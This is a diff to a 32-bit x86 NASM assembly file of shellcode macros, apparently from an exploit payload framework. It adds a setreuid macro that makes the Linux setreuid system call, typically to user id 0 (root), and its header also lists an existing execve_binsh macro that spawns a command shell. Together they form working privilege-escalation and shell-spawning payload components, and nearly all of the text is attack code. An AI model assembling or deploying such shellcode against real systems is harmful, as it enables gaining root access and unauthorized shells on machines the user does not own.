@@ -20,6 +20,7 @@
 ; Macro List:
 ;
 ;        execve_binsh - Executes a command shell with flags
+;        setreuid     - Set real/effective user id
 ;;
 BITS 32
 
@@ -57,7 +58,6 @@ dup_loop:
 	%endif
 
 execve:
-
 	push byte 0xb
 	pop  eax
 	cdq
@@ -95,6 +95,45 @@ execve:
 	
 	push ebx
 	mov  ecx, esp
+	int  0x80
+
+%endmacro
+
+;;
+;     Macro: setreuid
+;   Purpose: Set effective user id
+; Arguments:
+;
+;    User ID: The user identifier to setreuid to, typically 0.
+;;
+
+%macro setreuid 1
+
+setreuid:
+
+	%if %1 == 0
+
+	xor  ecx, ecx
+
+	%else
+
+		%if %1 < 256
+
+		push byte %1
+
+		%else
+
+		push dword %1
+
+		%endif
+
+	pop  ecx
+
+	%endif
+
+	mov  ebx, ecx
+	push byte 0x46
+	pop  eax
 	int  0x80
 
 %endmacro
